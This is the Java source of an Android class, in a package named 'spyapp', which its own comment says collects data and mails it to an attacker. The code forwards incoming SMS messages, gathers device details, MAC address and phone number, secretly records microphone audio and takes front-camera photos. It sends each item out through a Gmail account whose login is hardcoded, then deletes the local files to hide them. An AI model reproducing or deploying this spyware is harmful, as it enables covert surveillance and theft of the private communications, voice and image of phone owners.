package com.example.ydg.spyapp;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.os.Build;
import android.media.MediaRecorder;
import android.content.pm.PackageManager;
import android.view.SurfaceView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import static android.hardware.Camera.*;

/**
 * Created by ydg on 2015-03-07.
 * SMS 분석 후 특정 자료를 수집한 후 새로운 스레드를 생성하여 공격자에게 정보를 메일로 전송
 */
public class InformationSend {
    public final static String LogTag = "checking_InfoSendLogcat";
    protected Context mContext;
    final String mailID = "apptestgyu@gmail.com";
    final String mailPW = "apptestgyu123";
    final String phoneNumber;
    String date;

    Camera camera;
    int cameraID = 0;

    InformationSend(Context context, String infoName) {
        Log.i(LogTag, "InformationSend class create");
        this.mContext = context;

        TelephonyManager teleMng = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        phoneNumber = teleMng.getLine1Number();
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss");
        date = dateFormat.format(new Date());

        switch (infoName) {
            case "Info":
                getPhoneInfo();
                break;
            case "Record":
                getRecordData();
                break;
            case "Capture":
                getCameraCapture();
                break;
            default:
                break;
        }
    }

    InformationSend(Context context, String smsSender, String smsBody) {
        Log.i(LogTag, "InformationSend class create");
        this.mContext = context;

        TelephonyManager teleMng = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        phoneNumber = teleMng.getLine1Number();

        smsSend(smsSender, smsBody);
    }

    public void smsSend(final String smsSender, final String smsBody) {
        Log.i(LogTag, "InformationSend.smsSend() Method");

        new Thread(new Runnable() {
            public void run() {
                GMailSender sender = new GMailSender(mailID, mailPW);
                try {
                    sender.sendMail(phoneNumber + " new SMS by " + smsSender, smsBody, mailID, mailID);
                    Thread.sleep(3000);
                    Log.i(LogTag, "new SMS Send to mail");
                }
                catch (Exception e) {
                    Log.e(LogTag, "smsSend() Method Error: " + e.getMessage(), e);
                }
            }
        }).start();
    }

    public void getPhoneInfo() {
        Log.i(LogTag, "InformationSend.getPhoneInfo() Method");
        final StringBuilder deviceInfo = new StringBuilder();

        WifiManager wifiMng = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMng.getConnectionInfo();
        String mac = wifiInfo.getMacAddress();

        deviceInfo.append("Device info ");
        deviceInfo.append("\n Brand: ");
        deviceInfo.append(Build.BRAND);
        deviceInfo.append("\n Manufacturer: ");
        deviceInfo.append(Build.MANUFACTURER);
        deviceInfo.append("\n Model: ");
        deviceInfo.append(Build.MODEL);
        deviceInfo.append("\n Product: ");
        deviceInfo.append(Build.PRODUCT);
        deviceInfo.append("\n User: ");
        deviceInfo.append(Build.USER);
        deviceInfo.append("\n Mac Address: ");
        deviceInfo.append(mac);
        deviceInfo.append("\n Phone Number: ");
        deviceInfo.append(phoneNumber);

        new Thread(new Runnable() {
            public void run() {
                GMailSender sender = new GMailSender(mailID, mailPW);
                try {
                    sender.sendMail(phoneNumber + " Device Info", deviceInfo.toString(), mailID, mailID);
                    Thread.sleep(3000);
                    Log.i(LogTag, "Phone Information mail send success");
                }
                catch (Exception e) {
                    Log.e(LogTag, "getPhoneInfo() Thread Error: " + e.getMessage(), e);
                }
            }
        }).start();
    }

    public void getRecordData() {
        Log.i(LogTag, "InformationSend.getRecordData() Method");

        MediaRecorder recorder = null;
        final String fileName = phoneNumber + "_record_" + date + ".mp4";
        final String filePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + fileName;

        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        if (Build.VERSION.SDK_INT >= 10) {
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(96000);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        }
        else {
            recorder.setAudioSamplingRate(8000);
            recorder.setAudioEncodingBitRate(12200);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        }

        recorder.setOutputFile(filePath);
        recorder.setMaxDuration(10 * 1000); // 10초

        try {
            recorder.prepare();
            Log.i(LogTag, "Record Prepared");
        }
        catch (Exception e)
        {
            Log.e(LogTag, "getRecordData() Error: " + e.getMessage(), e);
            e.printStackTrace();
        }
        recorder.start();
        Log.i(LogTag, "Record Start");

        recorder.setOnInfoListener(new MediaRecorder.OnInfoListener() {
            @Override
            public void onInfo(MediaRecorder mr, int what, int extra) {
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    mr.stop();
                    Log.i(LogTag, "Record Stop");
                }
            }
        });

        new Thread(new Runnable() {
            public void run() {
                GMailSender sender = new GMailSender(mailID, mailPW);
                try {
                    Log.i(LogTag, "Waiting for record");
                    Thread.sleep(13 * 1000); // 10초 녹음에 3초 더 기다림
                    sender.sendMailWithFile(phoneNumber + " Recorded File", "60 seconds", mailID, mailID, filePath, fileName);
                    Thread.sleep(5 * 1000); // 보내기까지 5초 더 기다림
                    Log.i(LogTag, "Record Data mail send success");

                    File recordFile = new File(filePath);
                    boolean deleted = recordFile.delete();
                    if (deleted == true) {
                        Log.i(LogTag, "Record file is deleted: " + deleted);
                    }
                    else {
                        Log.e(LogTag, "Record file isn't deleted: " + deleted);
                    }
                }
                catch (Exception e) {
                    Log.e(LogTag, "getRecordData() Thread Error: " + e.getMessage(), e);
                }
            }
        }).start();
    }

    public void getCameraCapture() {
        Log.i(LogTag, "InformationSend.getCameraCapture() Method");

        final String fileName = phoneNumber + "_capture_" + date + ".jpg";
        final String filePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + fileName;
        final File pictureFile = new File(filePath);

        if (!mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            Log.e(LogTag, "No camera on this device");
        } else {
            cameraID = findFrontFacingCamera();
            if (cameraID < 0) {
                Log.e(LogTag, "No front facing camera found");
            } else {
                Log.d(LogTag, "cameraID: " + cameraID);
                safeCameraOpen(cameraID);
            }
        }

        SurfaceView surfaceView = new SurfaceView(mContext);

        try {
            camera.setPreviewDisplay(surfaceView.getHolder());
        } catch (IOException e) {
            e.printStackTrace();
        }
        camera.startPreview();
        Camera.Parameters params = camera.getParameters();
        params.setPictureFormat(ImageFormat.JPEG);
        params.setJpegQuality(100);
        camera.setParameters(params);

        Camera.PictureCallback mCall = new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(final byte[] data, Camera camera) {
                Log.i(LogTag, "onPictureTaken");
                new Thread(new Runnable() {
                    public void run() {
                        GMailSender sender = new GMailSender(mailID, mailPW);
                        try {
                            FileOutputStream fos = new FileOutputStream(pictureFile);
                            fos.write(data);
                            fos.flush();
                            fos.close();
                            Log.i(LogTag, "Capture file saved");
                        } catch (Exception e) {
                            Log.e(LogTag, fileName + " not saved: " + e.getMessage(), e);
                        }
                        try {
                            Log.i(LogTag, "Waiting for capture");
                            Thread.sleep(1000);
                            sender.sendMailWithFile(phoneNumber + " Capture File", "Front camera", mailID, mailID, filePath, fileName);
                            Thread.sleep(5 * 1000); // 보내기까지 5초 기다림
                            Log.i(LogTag, "Capture file mail send success");

                            boolean deleted = pictureFile.delete();
                            if (deleted == true) {
                                Log.i(LogTag, "Capture file is deleted: " + deleted);
                            } else {
                                Log.e(LogTag, "Capture file isn't deleted: " + deleted);
                            }
                        } catch (InterruptedException e) {
                            Log.e(LogTag, "getCameraCapture() Thread Error: " + e.getMessage(), e);
                        } catch (Exception e) {
                            Log.e(LogTag, "getCameraCapture() Error: " + e.getMessage(), e);
                        }
                    }
                }).start();
            }
        };

        camera.takePicture(null, null, mCall);
        releaseCamera();
    }

    private int findFrontFacingCamera() {
        int cameraID = -1;

        int numberOfCameras = getNumberOfCameras();
        for (int i =0; i < numberOfCameras; i++) {
            CameraInfo cameraInfo = new CameraInfo();
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == CameraInfo.CAMERA_FACING_FRONT) {
                Log.i(LogTag, "Camera found");
                cameraID = i;
                break;
            }
        }

        return cameraID;
    }

    private boolean safeCameraOpen(int id) {
        boolean qOpened = false;
        try {
            releaseCamera();
            camera = Camera.open(id);
            qOpened = (camera != null);
        } catch (Exception e) {
            Log.e(LogTag, "Failed to open camera: " + e.getMessage(), e);
            // Log.e(getString(R.string.app_name), "~");
            e.printStackTrace();
        }

        return qOpened;
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}
